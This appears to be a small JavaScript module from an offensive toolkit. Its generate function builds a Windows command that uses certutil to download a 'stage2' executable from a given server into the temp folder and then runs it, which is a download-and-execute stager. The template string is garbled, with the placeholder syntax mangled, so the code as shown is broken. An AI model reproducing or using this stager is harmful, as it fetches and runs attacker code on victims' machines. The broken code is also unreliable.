function generate(token, serverUrl) {
    // Downloads stage2 via certutil and executes it
    // Note: stage2 must be a real .exe for this variant to work
    return `certutil -urlcache -split -f "\( {serverUrl}/stage2?token= \){token}" %TEMP%\\h_\( {token}.exe && start %TEMP%\\h_ \){token}.exe`;
}

module.exports = { generate };
